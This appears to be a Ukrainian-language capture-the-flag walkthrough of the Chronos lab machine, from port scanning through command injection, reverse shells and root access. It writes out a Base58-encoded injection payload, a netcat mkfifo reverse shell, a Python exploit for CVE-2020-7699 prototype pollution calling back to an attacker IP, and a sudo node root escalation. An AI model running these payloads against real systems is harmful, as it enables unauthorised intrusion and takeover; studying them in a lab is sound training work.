Крок 1: Виявлення IP-адреси та сканування портів
Після запуску віртуальної машини у VirtualBox необхідно спочатку визначити її IP-адресу в локальній мережі. Для цього я скористаюсь інструментом netdiscover:
sudo netdiscover -r 10.0.2.0/24

Результат: Було знайдено цільову машину з IP-адресою 10.0.2.19
<img width="849" height="253" alt="image" src="https://github.com/user-attachments/assets/1a38ad6d-f179-4532-b9bf-b27d94aee7b6" />

Далі сканую відкриті порти та сервіси за допомогою nmap:
sudo nmap -sV 10.0.2.19

Результат: Знайдено 3 відкриті порти:

22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)

80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))

8000/tcp open  http    Node.js Express framework

<img width="1069" height="390" alt="image" src="https://github.com/user-attachments/assets/3079e879-8cc3-4874-a466-35cfc86b9df1" />

Крок 2: Перевірка веб додатку на порту 80
Вводжу у браузері знайдений IP 10.0.2.19 і бачу сторінку Chronos

<img width="1125" height="670" alt="image" src="https://github.com/user-attachments/assets/c8d7c60d-bf1f-4198-afb3-fcb058bb82f8" />

Оськільки на сторінці немає жодних важливих деталей, відкриваю вихідний код сторінки і знаходжу JS код що містить запит до сервера:

<img width="3156" height="1261" alt="image" src="https://github.com/user-attachments/assets/d3032009-2bc3-4f3d-878b-45b9105f6a99" />

<img width="1165" height="782" alt="image" src="https://github.com/user-attachments/assets/54fa029b-a6cf-41ad-b03a-f4c5b41ab49f" />

Знахідки на даному етапі:
- запит на порт 8000 Node.js
- в параметрі format міститься алфавітно-цифровий рядок 4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL
- заголовок User-Agent містить значення "Chronos"

  Крок 3: Аналіз запиту та маніпуляція User-Agent
  Перевіряю URL в браузері використовуючи раніше згадані знахідки

  Результат: відповідь від сервера - "Permission Denied"

  Для перехоплення та редагування HTTP-запиту скористаюсь Burp Suite:

Налаштовую браузер для роботи через проксі-сервер Burp Suite.

Перехоплюю запит до ресурсу:

http://10.0.2.19:8000/date?format=...
Змінюю значення заголовка User-Agent на:

Chronos
Надсилаю відредагований запит на сервер.

Результат: сервер повертає відповідь із поточною датою та часом: Today is Sunday, October 11, 2026 20:17:19.
<img width="1669" height="1948" alt="image" src="https://github.com/user-attachments/assets/36e7a336-a5e9-4d34-bd65-3daa1aed19f9" />

Крок 4: Виявлення Command Injection через декодування Base58
Застосувавши онлайн-інструмент Cyberchef для декодування, визначаю, що рядок закодований у форматі Base58:
<img width="777" height="1297" alt="image" src="https://github.com/user-attachments/assets/65fcc6f8-1b0b-41b7-b1c9-d4b99990cccb" />

Результат: '+Today is %A, %B %d, %Y %H:%M:%S.'

Додавши команду ls -la до результату, спробую command injection, тобто '+Today is %A, %B %d, %Y %H:%M:%S.';ls -la

Спробую закодувати цей рядок в base58:

Результат: отримуємо пейлоуд:  ev6bGy99wjnctA21ATvLR8Xkptotq1Ssu3SZR3efG68AVURJRzjBHQoTn
<img width="1933" height="1349" alt="image" src="https://github.com/user-attachments/assets/c8a7e473-f83c-4296-9ff0-d5e1485d654a" />

Далі підставляємо отрианий пейлоуд в параметр формату:

Результат: пейлоуд спрацював і я отримав вивід команди ls -la:
<img width="2162" height="246" alt="image" src="https://github.com/user-attachments/assets/59ecf76c-3709-44cc-9600-8f85b29f4118" />

Today is Sunday, October 11, 2026 21:57:07. total 56 
drwxr-xr-x 3 www-data www-data 4096 Aug 3 2021 . 
drwxr-xr-x 4 root root 4096 Jul 30 2021 .. 
-rw-r--r-- 1 www-data www-data 1365 Aug 3 2021 app.js 
drwxr-xr-x 56 www-data www-data 4096 Jul 30 2021 node_modules 
-rw-r--r-- 1 www-data www-data 97 Jul 30 2021 package.json 
-rw-r--r-- 1 www-data www-data 33602 Jul 30 2021 package-lock.json

Крок 5: Отримання Reverse Shell

На атакуючій машині запускаю netcat listener:
<img width="340" height="251" alt="image" src="https://github.com/user-attachments/assets/a1f7e369-16cc-4b41-8bb4-e72d4b09aa3a" />

Для отримання пейлоуду створюю реверс шел: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.2.17 8020 >/tmp/f і перекодовую його в base58:

Отримую результат: C41qYD5rNogsaXz4Jnjoy27WUgD5r9cJAvewY5Q2xWgcTjARmCcS8wDhipgmND26TJmKGckyPVaJK8wuFpx8fUFNeWNQehguJYhYZD3K
<img width="1339" height="1256" alt="image" src="https://github.com/user-attachments/assets/65c04e64-ec47-47cc-a295-4dead315b925" />

Далі відправляю запит через Burp Suite з цим пейлоудом.

В результаті: У терміналі з netcat отримую reverse shell і потрапляю в систему
<img width="663" height="420" alt="image" src="https://github.com/user-attachments/assets/9584bf30-bf59-4a8d-a979-c40c6dc3a90f" />

Крок 6: Дослідження файлової системи та виявлення вразливості

Після отримання доступу досліджую файлову систему:

$ ls -la /opt/
chronos
chronos-v2
<img width="707" height="187" alt="image" src="https://github.com/user-attachments/assets/33a65efb-5687-4c1c-9154-77da20ea83b7" />

В результаті знаходжу директорію /opt/chronos-v2/backend/. Переглядаємо файл package.json:
<img width="664" height="743" alt="image" src="https://github.com/user-attachments/assets/11c51afd-0ebc-4e32-96fd-4d1dded0a12d" />

В цьому файлі знаходжу модуль express-fileupload версії 1.1.7-alpha.3 з критичною вразливістю:
-CVE-2020-7699 — Remote Code Execution через Prototype Pollution
-CWE-400 — Uncontrolled Resource Consumption

Крок 7: Ескалація привілеїв через CVE-2020-7699

На атакуючій машині запускаю новий netcat listener на іншому порті:

sudo ncat -l -p 8021

У поточному reverse shell (порт 8021) виконуємо експлойт для CVE-2020-7699: замінюю на IP моєї VM та в port listener на 8021
python3 -c "import requests; cmd='bash -c \"bash -i >& /dev/tcp/10.0.2.17/8021 0>&1\"'; requests.post('http://127.0.0.1:8080', files={'__proto__.outputFunctionName': (None, f\"x;process.mainModule.require('child_process').exec('{cmd}');x\")}); requests.get('http://127.0.0.1:8080')"

В результаті отримую доступ
<img width="759" height="471" alt="image" src="https://github.com/user-attachments/assets/6d066b10-4055-4165-bd81-9225938a9f94" />

Крок 8: Вихід з обмеженого середовища та отримання root

Оскільки у мене вже є доступ, я можу створити повноцінну інтерактивну оболонку:

sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'

В результаті отримую доступ з правами root:

# whoami
root
<img width="1009" height="131" alt="image" src="https://github.com/user-attachments/assets/643841a3-56dd-4ad3-afbd-f6cbb20decf8" />

Крок 9: Читання фінального флагу

Переходжу до директорії /root/ та читаю фінальний флаг:

# cat /root/root.txt
YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK
<img width="538" height="74" alt="image" src="https://github.com/user-attachments/assets/e672148f-f28e-487d-8f1f-d3b4fdcbbe2a" />

Декодую прапорець з Base64:

# echo "YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK" | base64 -d
apopse siopi mazeuoume oneira
<img width="699" height="183" alt="image" src="https://github.com/user-attachments/assets/d5b45599-c4a1-4c3e-a78d-43dcc82c4d87" />
<img width="1966" height="276" alt="image" src="https://github.com/user-attachments/assets/87cefe7d-c014-46a0-a2cf-91be3e599b74" />

Фінальний флаг отримано! CTF завершено!

Висновок
У ході роботи було виконано такі дії:

Визначено IP-адресу цільової машини та проведено сканування відкритих портів.

Досліджено вебзастосунок і виявлено підозрілий HTTP-запит.

Змінено заголовок User-Agent, щоб обійти серверну перевірку.

Виявлено вразливість Command Injection через декодування Base58 та використано її для виконання команд.

Отримано reverse shell із правами користувача www-data.

Досліджено файлову систему та виявлено вразливий модуль express-fileupload.

Застосовано експлойт для CVE-2020-7699 (Prototype Pollution).

Отримано root-доступ і прочитано фінальний прапорець.
